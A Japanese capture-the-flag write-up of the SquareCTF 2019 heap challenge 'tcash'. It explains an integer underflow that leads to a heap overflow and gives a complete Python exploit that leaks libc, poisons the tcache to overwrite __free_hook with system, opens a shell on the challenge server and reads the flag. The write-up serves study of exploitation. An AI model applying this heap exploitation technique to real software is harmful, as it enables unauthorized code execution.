# [pwn 1000pts] tcash - SquareCTF 2019
64-bitで全部有効です。
```
$ checksec -f tcash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   83 Symbols     Yes      0               4       tcash
```
ヒープ系問題で、malloc, write, print, freeできます。ただし、mallocは必ず0x6f8バイト確保されます。mallocする際に指定したサイズ(0<=size<=0x6f8)も保存されるのですが、デクリメントされています。サイズはint型なのでmallocで0を指定すると0xffffffffとなり、writeでヒープオーバーフローが発生します。
また、メニューで1337を指定すると`secret_chunk`関数が使われ、中で`malloc(0x308)`が2回実行され、各チャンクに書き込めます。ということで、ヒープオーバーフローでサイズを書き換えたチャンクをfreeし、さらにfdを`__free_hook`などに書き換えてやればOKです。
```python
from ptrlib import *

def malloc(index, size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("?\n", str(index))
    sock.sendlineafter("size: \n", str(size))
    return

def write(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("?\n", str(index))
    sock.sendafter("data: \n", data)
    return

def read(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("?\n", str(index))
    r = sock.recvuntil("1) ")
    return r[:-3]

def free(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("?\n", str(index))
    return

def secret(index, data1, data2):
    sock.sendlineafter("> ", "1337")
    sock.sendlineafter("?\n", str(index))
    sock.sendafter("data 1: \n", data1)
    sock.sendafter("data 2: \n", data2)
    return

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./tcash")
sock = Socket("tcash-a57a558adff75b59.squarectf.com", 7852)
libc_main_arena = 0x3ebc40

# libc leak
malloc(0, 0x6f8)
malloc(1, 0x6f8)
free(0)
malloc(0, 0x6f8)
libc_base = u64(read(0)[:8]) - libc_main_arena - 96
logger.info("libc base = " + hex(libc_base))

# heap overflow
free(0)
malloc(0, 0)
payload = b'A' * 0x6f8 + p64(0x311) + b"\n"
write(0, payload)
free(1)
payload = b'A' * 0x6f8 + p64(0x311) + p64(libc_base + libc.symbol("__free_hook")) + b"\n"
write(0, payload)

# overwrite __free_hook
secret(0, "dummy", p64(libc_base + libc.symbol("system")))

# get the shell!!
malloc(9, 0x8)
write(9, "/bin/sh\n")
free(9)

sock.interactive()
```

よし！
```
$ python solve.py 
[+] __init__: Successfully connected to tcash-a57a558adff75b59.squarectf.com:7852
[+] <module>: libc base = 0x7f388a679000
[ptrlib]$ cat /home/tcash/flag.txt
[ptrlib]$ flag-53AE19D1869BF54B5DDEF813
```

# 感想
デクリメントでオーバーフローする問題は初めてで面白かったです。